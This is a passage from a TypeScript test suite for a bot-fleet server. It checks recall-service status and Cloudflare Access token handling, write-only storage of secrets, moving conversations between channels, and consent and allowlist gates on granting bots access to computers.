        hasAccessSecret: (accessSecret ?? "").length > 0,
        authorization: headerValue(req.headers.authorization),
      });
      if ((req.url ?? "").startsWith("/cdn-cgi/access/login/")) {
        res.writeHead(200, { "content-type": "text/html" });
        res.end("<html><body>Sign in with your identity provider to continue.</body></html>");
        return;
      }
      const admitted = token !== null && accessId === token.id && accessSecret === token.secret;
      if (!admitted) {
        res.writeHead(302, { location: "/cdn-cgi/access/login/recall.example.com?kid=fixture" });
        res.end();
        return;
      }
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ ok: true, collection: "fake-corpus", points: 36939, backend_ok: true, version: "1.2.3" }));
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    // SAFETY: listen() has resolved on a TCP socket, so address() is an
    // AddressInfo with a bound port, never null or a pipe name.
    const port = (server.address() as { port: number }).port;
    return {
      url: `http://127.0.0.1:${port}`,
      seen,
      close: () => new Promise<void>((resolve) => server.close(() => resolve())),
    };
  };

  // The recall fixture is a POSIX shell script.  Windows cannot execute it, so
  // the two tests about the CLI's own behaviour self-skip there, the same deal
  // the other process-shaped tests in this file get.  The HTTP tests below
  // still run everywhere: an explicit service URL bypasses the local CLI.
  const posixOnly = it.skipIf(process.platform === "win32");

  posixOnly("waits for a slow local recall CLI instead of calling it dead at six seconds", async () => {
    setRecallMode("slow");
    try {
      const started = Date.now();
      const status = await api("GET", "/api/qdrant/status");
      expect(status.status).toBe(200);
      expect(status.body).toMatchObject({
        ready: true,
        source: "recall-cli",
        collection: "fake-corpus",
        pointsCount: 42,
      });
      // The fixture sleeps past the old ceiling deliberately: the whole bug
      // was a 6s timeout on a command that takes longer than that.
      expect(Date.now() - started).toBeGreaterThan(6_000);
    } finally {
      setRecallMode("ok");
    }
  });

  posixOnly("reports why the local recall CLI failed instead of one fixed sentence", async () => {
    setRecallMode("fail");
    try {
      const status = await api("GET", "/api/qdrant/status");
      expect(status.status).toBe(200);
      expect(status.body.ready).toBe(false);
      const error = String(status.body.error);
      expect(error).toContain("recall stats --json");
      expect(error).toContain("it exited 3");
      expect(error).toContain("could not reach the embedder");
    } finally {
      setRecallMode("ok");
    }
  });

  it("names Cloudflare Access when the service answers with a login redirect", async () => {
    setRecallMode("ok");
    const stub = await startGatedRecall(null);
    const clear = await configureRecall({ url: stub.url, collection: "fake-corpus" });
    try {
      const status = await api("GET", "/api/qdrant/status");
      expect(status.body).toMatchObject({ ready: false, configured: true, accessGated: true });
      const error = String(status.body.error);
      expect(error).toContain("login page");
      expect(error).toContain("Cloudflare Access");
      expect(error).toContain("service token");
      // No Access token configured means neither header goes out.
      expect(stub.seen.every((hit) => hit.accessId === undefined && !hit.hasAccessSecret)).toBe(true);
    } finally {
      await clear();
      await stub.close();
      setRecallMode("ok");
    }
  });

  it("sends the Access service token headers alongside the bearer when one is configured", async () => {
    setRecallMode("ok");
    const token = { id: "fixture-client.access", secret: "fixture-access-secret" };
    const stub = await startGatedRecall(token);
    const clear = await configureRecall({
      url: stub.url,
      apiKey: "fixture-bearer",
      collection: "fake-corpus",
      accessClientId: token.id,
      accessClientSecret: token.secret,
    });
    try {
      const status = await api("GET", "/api/qdrant/status");
      expect(status.body).toMatchObject({
        ready: true,
        configured: true,
        source: "recall-service",
        collection: "fake-corpus",
        pointsCount: 36939,
      });
      expect(stub.seen.length).toBeGreaterThan(0);
      for (const hit of stub.seen) {
        expect(hit.accessId).toBe(token.id);
        expect(hit.hasAccessSecret).toBe(true);
        // Alongside, never instead of: a deployment may gate at the edge,
        // at the origin, or at both.
        expect(hit.authorization).toBe("Bearer fixture-bearer");
      }
      // /health alone proves nothing on an Access host — that route is the
      // usual public bypass — so a real recall route is probed too.
      expect(stub.seen.map((hit) => hit.path)).toContain("/recall/stats");
    } finally {
      await clear();
      await stub.close();
      setRecallMode("ok");
    }
  });

  it("follows a same-host redirect (e.g. an http:// -> https:// upgrade) instead of reporting an Access gate", async () => {
    // The bug this guards against: a fetch made with `redirect: "manual"`
    // treated ANY 3xx as an identity gateway, so a plain scheme upgrade or a
    // trailing-slash normalisation on the operator's own host produced the
    // same "behind Cloudflare Access — add a service token" message this
    // block's earlier tests pin for a real gateway.
    setRecallMode("ok");
    const server = createServer((req, res) => {
      if (req.url === "/health") {
        res.writeHead(301, { location: "/health-canonical" });
        res.end();
        return;
      }
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify({ collection: "fake-corpus", points: 500, backend_ok: true, version: "1.2.3" }));
    });
    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
    // SAFETY: listen() has resolved on a TCP socket, so address() is an
    // AddressInfo with a bound port, never null or a pipe name.
    const port = (server.address() as { port: number }).port;
    const clear = await configureRecall({ url: `http://127.0.0.1:${port}`, collection: "fake-corpus" });
    try {
      const status = await api("GET", "/api/qdrant/status");
      expect(status.body).toMatchObject({ ready: true, configured: true, source: "recall-service", collection: "fake-corpus" });
      expect(status.body.accessGated).toBeUndefined();
    } finally {
      await clear();
      await new Promise<void>((resolve) => server.close(() => resolve()));
      setRecallMode("ok");
    }
  });

  it("never returns the Access client secret from /api/config", async () => {
    const secret = "fixture-write-only-secret";
    const saved = await api("PATCH", "/api/config", {
      qdrant: { accessClientId: "fixture-client.access", accessClientSecret: secret },
    });
    expect(saved.status).toBe(200);
    expect(saved.body.qdrant).toMatchObject({
      accessClientId: "fixture-client.access",
      hasAccessClientSecret: true,
      hasAccessServiceToken: true,
      accessTokenState: "complete",
    });
    expect(JSON.stringify(saved.body)).not.toContain(secret);

    const after = await api("GET", "/api/config");
    expect(after.status).toBe(200);
    expect(JSON.stringify(after.body)).not.toContain(secret);

    // It is stored, just never echoed — the same deal every other credential
    // in this config gets.
    const disk = JSON.parse(readFileSync(join(home, ".botfleet", "config.json"), "utf8"));
    expect(disk.qdrant.accessClientSecret).toBe(secret);

    // Half a pair sends no Access headers at all, so the panel has to be
    // able to tell that apart from "no token" — and say which half is gone.
    await api("PATCH", "/api/config", { qdrant: { accessClientId: "" } });
    const halved = await api("GET", "/api/config");
    expect(halved.body.qdrant).toMatchObject({
      hasAccessClientSecret: true,
      hasAccessServiceToken: false,
      accessTokenState: "missing-id",
    });

    await api("PATCH", "/api/config", { qdrant: { accessClientId: "", accessClientSecret: "" } });
    const cleared = await api("GET", "/api/config");
    expect(cleared.body.qdrant).toMatchObject({
      hasAccessClientSecret: false,
      hasAccessServiceToken: false,
      accessTokenState: "none",
    });
  });
});

describe("GET /api/transcripts/export", () => {
  it("returns every conversation, with its owner and whether each message is live", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Kept", memberIds: [bot.id] })).body.group;

    const res = await api("GET", "/api/transcripts/export");
    expect(res.status).toBe(200);
    expect(typeof res.body.exportedAt).toBe("string");
    expect(res.body.conversationCount).toBe(res.body.conversations.length);

    const forRoom = res.body.conversations.find((c: any) => c.owner.id === room.id);
    expect(forRoom).toBeDefined();
    expect(forRoom.owner.kind).toBe("channel");
    expect(forRoom.owner.name).toBe("Kept");
    expect(Array.isArray(forRoom.messages)).toBe(true);

    const forBot = res.body.conversations.find((c: any) => c.owner.id === bot.id);
    expect(forBot).toBeDefined();
    expect(forBot.owner.kind).toBe("bot");
    // Abandoned branches are kept, so each message says whether it is live.
    for (const message of forBot.messages) {
      expect(typeof message.onActivePath).toBe("boolean");
    }
  });
});

describe("moving a conversation between channels", () => {
  it("carries the transcript with it and leaves neither channel empty", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const from = (await api("POST", "/api/groups", { name: "From", memberIds: [bot.id] })).body.group;
    const to = (await api("POST", "/api/groups", { name: "To", memberIds: [bot.id] })).body.group;
    // A channel keeps its last conversation, so give the source a second one.
    const extra = (await api("POST", `/api/groups/${from.id}/tasks`, { title: "Moving day" })).body
      .task;

    const moved = await api("PATCH", `/api/groups/${from.id}/tasks/${extra.threadId}`, {
      groupId: to.id,
    });
    expect(moved.status).toBe(200);

    const rooms = (await api("GET", "/api/bots?messages=0")).body.groups as any[];
    const source = rooms.find((room) => room.id === from.id);
    const target = rooms.find((room) => room.id === to.id);
    expect(source.tasks.some((t: any) => t.threadId === extra.threadId)).toBe(false);
    expect(target.tasks.some((t: any) => t.threadId === extra.threadId)).toBe(true);
    // The thread id is unchanged, which is what keeps the transcript intact.
    const landed = target.tasks.find((t: any) => t.threadId === extra.threadId);
    expect(landed.title).toBe("Moving day");
  });

  it("moves a conversation to a bot, where it becomes one of that bot's threads", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Handover", memberIds: [bot.id] })).body
      .group;
    const extra = (await api("POST", `/api/groups/${room.id}/tasks`, { title: "Over to you" })).body
      .task;

    const res = await api("PATCH", `/api/groups/${room.id}/tasks/${extra.threadId}`, {
      botId: bot.id,
    });
    expect(res.status).toBe(200);

    const roster = (await api("GET", "/api/bots?messages=0")).body;
    const landed = roster.bots.find((b: any) => b.id === bot.id);
    const source = roster.groups.find((g: any) => g.id === room.id);
    expect(landed.tasks.some((t: any) => t.threadId === extra.threadId)).toBe(true);
    expect(source.tasks.some((t: any) => t.threadId === extra.threadId)).toBe(false);
  });

  it("404s on a bot that does not exist", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Nowhere", memberIds: [bot.id] })).body
      .group;
    const res = await api("PATCH", `/api/groups/${room.id}/tasks/${room.threadId}`, {
      botId: "bot_nope",
    });
    expect(res.status).toBe(404);
  });

  it("refuses to empty a channel of its last conversation", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const only = (await api("POST", "/api/groups", { name: "Only", memberIds: [bot.id] })).body.group;
    const other = (await api("POST", "/api/groups", { name: "Other", memberIds: [bot.id] })).body
      .group;
    const res = await api("PATCH", `/api/groups/${only.id}/tasks/${only.threadId}`, {
      groupId: other.id,
    });
    expect(res.status).toBe(400);
  });

  it("404s on a channel that does not exist", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const from = (await api("POST", "/api/groups", { name: "Source", memberIds: [bot.id] })).body
      .group;
    const res = await api("PATCH", `/api/groups/${from.id}/tasks/${from.threadId}`, {
      groupId: "grp_nope",
    });
    expect(res.status).toBe(404);
  });

  it("still renames when no destination is given", async () => {
    const bot = (await api("POST", "/api/bots")).body.bot;
    const room = (await api("POST", "/api/groups", { name: "Rename", memberIds: [bot.id] })).body
      .group;
    const res = await api("PATCH", `/api/groups/${room.id}/tasks/${room.threadId}`, {
      title: "Renamed by hand",
    });
    expect(res.status).toBe(200);
    expect(res.body.task.title).toBe("Renamed by hand");
  });
});

describe("PATCH /api/terminology", () => {
  it("stores a preset and hands clients the resolved words", async () => {
    const res = await api("PATCH", "/api/terminology", { terminology: "repos" });
    expect(res.status).toBe(200);
    expect(res.body.terminology).toBe("repos");
    expect(res.body.roomLabels).toEqual({ singular: "Repo", plural: "Repos" });
    // The resolved pair is on GET too, so a client that reconnects agrees.
    const status = await api("GET", "/api/config");
    expect(status.body.roomLabels).toEqual({ singular: "Repo", plural: "Repos" });
  });

  it("keeps both forms of a custom word, including an irregular plural", async () => {
    const res = await api("PATCH", "/api/terminology", {
      terminology: "custom",
      terminologyCustom: { singular: "Person", plural: "People" },
    });
    expect(res.status).toBe(200);
    expect(res.body.roomLabels).toEqual({ singular: "Person", plural: "People" });
  });

  it("refuses a word that is not one of the presets", async () => {
    const res = await api("PATCH", "/api/terminology", { terminology: "wormholes" });
    expect(res.status).toBe(400);
  });

  it("refuses an empty patch", async () => {
    expect((await api("PATCH", "/api/terminology", {})).status).toBe(400);
  });

  it("does not accept anything else that lives in the config file", async () => {
    // The route exists so the phone never needs write access to /api/config;
    // it must not become a side door into the rest of it.
    const res = await api("PATCH", "/api/terminology", {
      terminology: "channels",
      profile: { name: "Someone Else" },
    });
    expect(res.status).toBe(200);
    const status = await api("GET", "/api/config");
    expect(status.body.profile?.name).not.toBe("Someone Else");
  });
});

describe("local Auto consent for inherited and discovered computers", () => {
  it("guards config defaults and per-bot Auto while preserving explicit Off", async () => {
    expect((await api("PUT", "/api/config", {
      botDefaults: { computers: ["cloud"], allowedComputers: null },
    })).status).toBe(200);
    const bot = (await api("POST", "/api/bots", { name: "Inherited Auto" })).body.bot;
    try {
      // A cloud-only inherited default has no host path, so Auto itself is
      // harmless and gives the config route a clean before-state.
      expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true })).status).toBe(200);

      // An empty default restores automatic discovery.  Only Darwin Auto
      // actually mounts the host from that path, so Linux/Windows must not
      // demand host-access consent for a grant the bot can never receive.
      const discovered = await api("PUT", "/api/config", {
        botDefaults: { computers: [], allowedComputers: null },
        profile: { name: "Must Not Persist Before Consent" },
      });
      if (process.platform === "darwin") {
        expect(discovered.status).toBe(400);
        expect(discovered.body.needsAcknowledgement).toEqual(expect.arrayContaining([
          { id: bot.id, name: "Inherited Auto" },
        ]));
        const refusedConfig = (await api("GET", "/api/config")).body;
        expect(refusedConfig.botDefaults.computers).toEqual(["cloud"]);
        expect(refusedConfig.profile?.name).not.toBe("Must Not Persist Before Consent");
        expect((await api("PUT", "/api/config", {
          botDefaults: { computers: [], allowedComputers: null },
          acknowledgeLocalAuto: true,
          acknowledgedBots: [],
        })).status).toBe(409);
        expect((await api("PUT", "/api/config", {
          botDefaults: { computers: [], allowedComputers: null },
          acknowledgeLocalAuto: true,
          acknowledgedBots: discovered.body.needsAcknowledgement,
        })).status).toBe(200);

        // The per-bot route must see the same automatic host fallback when
        // Auto is enabled after the default has already become empty.
        expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: false })).status).toBe(200);
        expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true })).status).toBe(400);
        expect((await api("PATCH", `/api/bots/${bot.id}`, {
          autoApprove: true,
          acknowledgeLocalAuto: true,
        })).status).toBe(200);
      } else {
        expect(discovered.status).toBe(200);
        expect(discovered.body.needsAcknowledgement).toBeUndefined();
        expect((await api("GET", "/api/config")).body.botDefaults.computers).toEqual([]);
        expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: false })).status).toBe(200);
        expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true })).status).toBe(200);
      }

      // With Auto off, inheriting an explicit Local default is allowed; the
      // later Auto toggle is the transition that creates the pair.
      expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: false })).status).toBe(200);
      expect((await api("PUT", "/api/config", {
        botDefaults: { computers: ["local"], allowedComputers: null },
      })).status).toBe(200);
      expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true })).status).toBe(400);
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        autoApprove: true,
        acknowledgeLocalAuto: true,
      })).status).toBe(200);

      // Explicit Off wins over both the workspace default and automatic
      // discovery, so enabling Auto cannot grant this bot a computer.
      expect((await api("PATCH", `/api/bots/${bot.id}`, {
        computers: [],
        autoApprove: false,
      })).status).toBe(200);
      expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true })).status).toBe(200);
      const stored = (await api("GET", "/api/bots")).body.bots.find(
        (candidate: { id: string }) => candidate.id === bot.id,
      );
      expect(stored.computers).toEqual([]);
      expect(stored.autoApprove).toBe(true);
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PUT", "/api/config", {
        botDefaults: { computers: ["cloud"], allowedComputers: null },
      })).status).toBe(200);
    }
  });
});

describe("local Auto consent follows the This Computer provider toggle", () => {
  it("requires the acknowledgement when a config save only turns This Computer back on", async () => {
    // The legacy allowlist stays unrestricted the whole time; only the
    // per-provider toggle moves.  resolveGrants drops Local while
    // computerProviders.localMac is off and mounts it again the moment the
    // toggle flips, so the flip is a host-access widening and must be gated
    // exactly like widening allowedComputers.
    const providers = { asciiBox: true, selfHostedVps: false, localVm: true, localMac: false };
    expect((await api("PUT", "/api/config", {
      botDefaults: { computers: ["cloud"], allowedComputers: null, computerProviders: providers },
    })).status).toBe(200);
    // Automatic discovery with This Computer off has no host path, so this
    // needs no acknowledgement on any platform.
    expect((await api("PUT", "/api/config", {
      botDefaults: { computers: [], allowedComputers: null, computerProviders: providers },
    })).status).toBe(200);
    const bot = (await api("POST", "/api/bots", { name: "Provider Flip Auto" })).body.bot;
    try {
      expect((await api("PATCH", `/api/bots/${bot.id}`, { autoApprove: true })).status).toBe(200);

      const flip = { botDefaults: { computerProviders: { ...providers, localMac: true } } };
      const flipped = await api("PUT", "/api/config", flip);
      if (process.platform === "darwin") {
        expect(flipped.status).toBe(400);
        expect(flipped.body.needsAcknowledgement).toEqual(expect.arrayContaining([
          { id: bot.id, name: "Provider Flip Auto" },
        ]));
        // Refused whole: This Computer is still off.
        const refused = (await api("GET", "/api/config")).body;
        expect(refused.botDefaults.computerProviders.localMac).toBe(false);
        const acked = await api("PUT", "/api/config", {
          ...flip,
          acknowledgeLocalAuto: true,
          acknowledgedBots: flipped.body.needsAcknowledgement,
        });
        expect(acked.status).toBe(200);
        expect(acked.body.botDefaults.computerProviders.localMac).toBe(true);
      } else {
        // Only Darwin Auto mounts the host from automatic discovery.
        expect(flipped.status).toBe(200);
        expect(flipped.body.needsAcknowledgement).toBeUndefined();
      }
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PUT", "/api/config", {
        botDefaults: {
          computers: ["cloud"],
          allowedComputers: null,
          computerProviders: { asciiBox: true, selfHostedVps: true, localVm: true, localMac: true },
        },
      })).status).toBe(200);
    }
  });
});

describe("cloud computer lifecycle routes honor the provider toggles", () => {
  it("refuses to provision, join, exec or screenshot on a turned-off provider, and still lets it sleep", async () => {
    const bot = (await api("POST", "/api/bots", { name: "Bea Boxless", cloudBackend: "box" })).body.bot;
    try {
      const off = await api("PUT", "/api/config", {
        botDefaults: { computerProviders: { asciiBox: false, selfHostedVps: true, localVm: true, localMac: true } },
      });
      expect(off.status).toBe(200);
      for (const action of ["provision", "join", "exec", "screenshot"]) {
        const refused = await api("POST", `/api/bots/${bot.id}/computer/${action}`, {});
        expect(refused.status).toBe(409);
        expect(String(refused.body.error)).toContain("ASCII.dev Box is turned off");
      }
      // Winding a computer down is never blocked by the toggle.
      const sleep = await api("POST", `/api/bots/${bot.id}/computer/sleep`, {});
      expect(String(sleep.body.error ?? "")).not.toContain("turned off in Computer settings");

      // A VPS bot is not affected by the Box toggle.
      const vpsBot = (await api("PATCH", `/api/bots/${bot.id}`, { cloudBackend: "vps" })).body.bot;
      expect(vpsBot.cloudBackend).toBe("vps");
      const vpsExec = await api("POST", `/api/bots/${bot.id}/computer/exec`, {});
      expect(String(vpsExec.body.error ?? "")).not.toContain("turned off in Computer settings");
    } finally {
      await api("PUT", "/api/config", {
        botDefaults: { computerProviders: { asciiBox: true, selfHostedVps: true, localVm: true, localMac: true } },
      });
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });
});

describe("Local VM lifecycle routes honor the provider toggle", () => {
  it("refuses to create or start a turned-off Local VM from the shared and per-bot routes", async () => {
    const bot = (await api("POST", "/api/bots", { name: "Vic Vmless" })).body.bot;
    try {
      const off = await api("PUT", "/api/config", {
        botDefaults: { computerProviders: { asciiBox: true, selfHostedVps: true, localVm: false, localMac: true } },
      });
      expect(off.status).toBe(200);
      for (const action of ["run", "start"]) {
        const refused = await api("POST", `/api/local-computer/${action}`, {});
        expect(refused.status).toBe(409);
        expect(String(refused.body.error)).toContain("Local VM is turned off");
      }
      const perBot = await api("POST", `/api/bots/${bot.id}/local-computer/run`, {});
      expect(perBot.status).toBe(409);
      expect(String(perBot.body.error)).toContain("Local VM is turned off");
    } finally {
      await api("PUT", "/api/config", {
        botDefaults: { computerProviders: { asciiBox: true, selfHostedVps: true, localVm: true, localMac: true } },
      });
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });

  it("lets a turned-on Local VM past the provider gate", async () => {
    const bot = (await api("POST", "/api/bots", { name: "Vera Vm" })).body.bot;
    try {
      const on = await api("PUT", "/api/config", {
        botDefaults: { computerProviders: { asciiBox: true, selfHostedVps: true, localVm: true, localMac: true } },
      });
      expect(on.status).toBe(200);
      // Shared mode answers the per-bot create with its own 409; the point is
      // that the provider gate is not what stopped it.
      const perBot = await api("POST", `/api/bots/${bot.id}/local-computer/run`, {});
      expect(String(perBot.body.error ?? "")).not.toContain("turned off in Computer settings");
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
    }
  });
});

describe("POST /api/bots/apply-defaults (set all bots to default)", () => {
  it("applies the workspace default to every bot, filtered through the allowlist", async () => {
    const ada = (await api("POST", "/api/bots", { name: "Ada Apply" })).body.bot;
    const lin = (await api("POST", "/api/bots", { name: "Lin Apply" })).body.bot;

    // Narrow the operator allowlist so the apply cannot smuggle a blocked
    // destination into a bot's computers list.
    const allow = await api("PUT", "/api/config", { botDefaults: { allowedComputers: ["cloud", "vm"] } });
    expect(allow.status).toBe(200);
    expect(allow.body.botDefaults.allowedComputers).toEqual(["cloud", "vm"]);

    const apply = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["cloud", "vm", "local"] },
    });
    expect(apply.status).toBe(200);
    expect(apply.body.applied).toBeGreaterThanOrEqual(2);
    // The applied set is the workspace default intersected with the
    // allowlist — the client should see exactly what every bot received.
    expect(apply.body.computers).toEqual(["cloud", "vm"]);

    const bots = (await api("GET", "/api/bots")).body.bots;
    const adaAfter = bots.find((b: { id: string }) => b.id === ada.id);
    const linAfter = bots.find((b: { id: string }) => b.id === lin.id);
    expect(adaAfter.computers).toEqual(["cloud", "vm"]);
    expect(linAfter.computers).toEqual(["cloud", "vm"]);

    await api("DELETE", `/api/bots/${ada.id}`);
    await api("DELETE", `/api/bots/${lin.id}`);
  });

  it("intersects the applied set with each bot's resolved cloud provider", async () => {
    // The apply-to-all client sends the legacy destination list, where
    // "cloud" collapses hosted Box and the self-hosted VPS into one entry.
    // Filtering only through the legacy allowlist would write "cloud" to a
    // bot whose real backend's provider toggle is off — a grant the runtime
    // strips again on the bot's next turn.  The apply must store the same
    // answer the runtime computes.
    expect((await api("PUT", "/api/config", {
      botDefaults: {
        allowedComputers: null,
        cloudBackend: "box",
        computerProviders: { asciiBox: false, selfHostedVps: true, localVm: true, localMac: true },
      },
    })).status).toBe(200);
    const boxBot = (await api("POST", "/api/bots", { name: "Box Off Apply" })).body.bot;
    const vpsBot = (await api("POST", "/api/bots", { name: "Vps On Apply" })).body.bot;
    expect((await api("PATCH", `/api/bots/${vpsBot.id}`, { cloudBackend: "vps" })).status).toBe(200);
    try {
      const apply = await api("POST", "/api/bots/apply-defaults", {
        botDefaults: { computers: ["cloud"] },
      });
      expect(apply.status).toBe(200);
      const bots = (await api("GET", "/api/bots")).body.bots;
      // Box-backed bot with Box off: every destination this apply would
      // grant is provider-disabled, so its own choice is left alone rather
      // than overwritten with a disabled provider or stripped to Off.
      expect(bots.find((b: { id: string }) => b.id === boxBot.id).computers ?? []).toEqual([]);
      // VPS-backed bot takes the grant: its resolved provider is on.
      expect(bots.find((b: { id: string }) => b.id === vpsBot.id).computers).toEqual(["cloud"]);
    } finally {
      await api("DELETE", `/api/bots/${boxBot.id}`);
      await api("DELETE", `/api/bots/${vpsBot.id}`);
      expect((await api("PUT", "/api/config", {
        botDefaults: {
          allowedComputers: null,
          cloudBackend: "box",
          computerProviders: { asciiBox: true, selfHostedVps: true, localVm: true, localMac: true },
        },
      })).status).toBe(200);
      // Leave the workspace default harmless for the suites that follow.
      expect((await api("POST", "/api/bots/apply-defaults", {
        botDefaults: { computers: ["cloud"] },
      })).status).toBe(200);
    }
  });

  it("refuses provider policy, which only PUT /api/config may change", async () => {
    const before = (await api("GET", "/api/config")).body.botDefaults;
    for (const policy of [
      { computerProviders: { asciiBox: true, selfHostedVps: true, localVm: true, localMac: false } },
      { vpsMode: "per-bot" },
      { allowedComputers: ["cloud"] },
    ]) {
      const refused = await api("POST", "/api/bots/apply-defaults", {
        botDefaults: { computers: ["cloud"], ...policy },
      });
      expect(refused.status).toBe(400);
      expect(refused.body.error).toMatch(/PUT \/api\/config/);
    }
    const after = (await api("GET", "/api/config")).body.botDefaults;
    expect(after.computerProviders).toEqual(before.computerProviders);
    expect(after.allowedComputers).toEqual(before.allowedComputers);
    expect(after.vpsMode).toEqual(before.vpsMode);
  });

  it("filters an atomic backend switch with the backend being applied", async () => {
    // Box off, VPS on, workspace backend Box.  Applying ["cloud"] together
    // with cloudBackend "vps" must judge each inheriting bot by the VPS
    // toggle it will actually run on, not the Box toggle being replaced.
    expect((await api("PUT", "/api/config", {
      botDefaults: {
        allowedComputers: null,
        cloudBackend: "box",
        computerProviders: { asciiBox: false, selfHostedVps: true, localVm: true, localMac: true },
      },
    })).status).toBe(200);
    const bot = (await api("POST", "/api/bots", { name: "Backend Switch Apply" })).body.bot;
    try {
      const apply = await api("POST", "/api/bots/apply-defaults", {
        botDefaults: { computers: ["cloud"], cloudBackend: "vps" },
      });
      expect(apply.status).toBe(200);
      const after = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === bot.id);
      expect(after.computers).toEqual(["cloud"]);
      expect((await api("GET", "/api/config")).body.botDefaults.cloudBackend).toBe("vps");
    } finally {
      await api("DELETE", `/api/bots/${bot.id}`);
      expect((await api("PUT", "/api/config", {
        botDefaults: {
          allowedComputers: null,
          cloudBackend: "box",
          computerProviders: { asciiBox: true, selfHostedVps: true, localVm: true, localMac: true },
        },
      })).status).toBe(200);
      expect((await api("POST", "/api/bots/apply-defaults", {
        botDefaults: { computers: ["cloud"] },
      })).status).toBe(200);
    }
  });

  it("rejects a non-array destination list and an unknown destination", async () => {
    const notArray = await api("POST", "/api/bots/apply-defaults", { botDefaults: { computers: "cloud" } });
    expect(notArray.status).toBe(400);
    const unknown = await api("POST", "/api/bots/apply-defaults", { botDefaults: { computers: ["box"] } });
    expect(unknown.status).toBe(400);
  });

  it("leaves a bot's own choice alone when the allowlist empties the apply set", async () => {
    const noAllow = await api("PUT", "/api/config", { botDefaults: { allowedComputers: ["cloud"] } });
    expect(noAllow.status).toBe(200);

    const eira = (await api("POST", "/api/bots", { name: "Eira Keep" })).body.bot;
    // The smoke environment is darwin; the host-mac acknowledgement is
    // only required when granting local for the first time.
    const set = await api("PATCH", `/api/bots/${eira.id}`, {
      computers: ["local"],
      autoApprove: true,
      acknowledgeLocalAuto: true,
    });
    expect(set.status).toBe(200);
    expect(set.body.bot.computers).toEqual(["local"]);

    // A workspace default the allowlist blocks entirely must NOT clear
    // the bot's local choice.  The apply's "computers" is the empty
    // intersection, and the runtime treats the bot's own [] as "Off" —
    // not as a permission to overwrite the bot's last named choice.
    const apply = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["local"] },
    });
    expect(apply.status).toBe(200);
    expect(apply.body.computers).toEqual([]);

    const after = (await api("GET", "/api/bots")).body.bots.find((b: { id: string }) => b.id === eira.id);
    // The bot's own previous choice stays put; the apply neither
    // overwrites it (filtered set is empty) nor strips it.
    expect(after.computers).toEqual(["local"]);

    await api("DELETE", `/api/bots/${eira.id}`);
    // restore the open allowlist for the next describe block.  This used to
    // 400 silently — the schema rejected null — which left the allowlist
    // narrowed to ["cloud"] for every test after it.
    const reopen = await api("PUT", "/api/config", { botDefaults: { allowedComputers: null } });
    expect(reopen.status).toBe(200);
    expect(reopen.body.botDefaults.allowedComputers ?? null).toBeNull();
  });

  it("preserves a bot that has been deliberately turned off (computers: [])", async () => {
    const off = (await api("POST", "/api/bots", { name: "Off Bot" })).body.bot;
    const on = (await api("POST", "/api/bots", { name: "On Bot" })).body.bot;

    // Turn the first bot off explicitly.  Empty `computers` array
    // means "Off", distinct from `undefined` (Auto) which inherits
    // the workspace default.
    const set = await api("PATCH", `/api/bots/${off.id}`, { computers: [] });
    expect(set.status).toBe(200);
    expect(set.body.bot.computers).toEqual([]);

    const apply = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["cloud"] },
    });
    expect(apply.status).toBe(200);

    const after = (await api("GET", "/api/bots")).body.bots;
    const offAfter = after.find((b: { id: string }) => b.id === off.id);
    const onAfter = after.find((b: { id: string }) => b.id === on.id);
    // Off bot stays off (apply skips bots with explicit `[]`).
    expect(offAfter.computers).toEqual([]);
    // On bot is patched to the workspace default.
    expect(onAfter.computers).toEqual(["cloud"]);

    await api("DELETE", `/api/bots/${off.id}`);
    await api("DELETE", `/api/bots/${on.id}`);
  });

  it("persists the operator's default unfiltered, and applies the filtered set", async () => {
    // Two different questions with two different answers.  The stored default
    // is what the operator asked for; the applied set is that intersected
    // with the allowlist.  Folding the intersection back into the stored
    // default means re-enabling a destination later cannot bring it back,
    // because the default it would come from was overwritten on the way in.
    expect((await api("PUT", "/api/config", { botDefaults: { allowedComputers: ["cloud"] } })).status).toBe(200);
    const apply = await api("POST", "/api/bots/apply-defaults", {
      botDefaults: { computers: ["cloud", "vm"] },
    });
    expect(apply.status).toBe(200);
    expect(apply.body.computers).toEqual(["cloud"]);
    expect(apply.body.config.botDefaults.computers).toEqual(["cloud", "vm"]);

    // Widening the allowlist afterwards brings the Local VM back with no
    // second trip through the picker.
    expect((await api("PUT", "/api/config", { botDefaults: { allowedComputers: null } })).status).toBe(200);
    const again = await api("POST", "/api/bots/apply-defaults", {});
    expect(again.status).toBe(200);
    expect(again.body.computers).toEqual(["cloud", "vm"]);
  });

  it("still requires the acknowledgement for an unattended autoApprove bot even when the allowlist blocks the destination right now", async () => {
    // The allowlist narrows what applies IMMEDIATELY; what gets PERSISTED as
    // the workspace default is unfiltered, and `resolveGrants` re-applies
    // whatever allowlist is CURRENT every time it reads that stored default.
    // A default blocked today can go live the moment the operator widens the
    // allowlist again, with no request ever having supplied
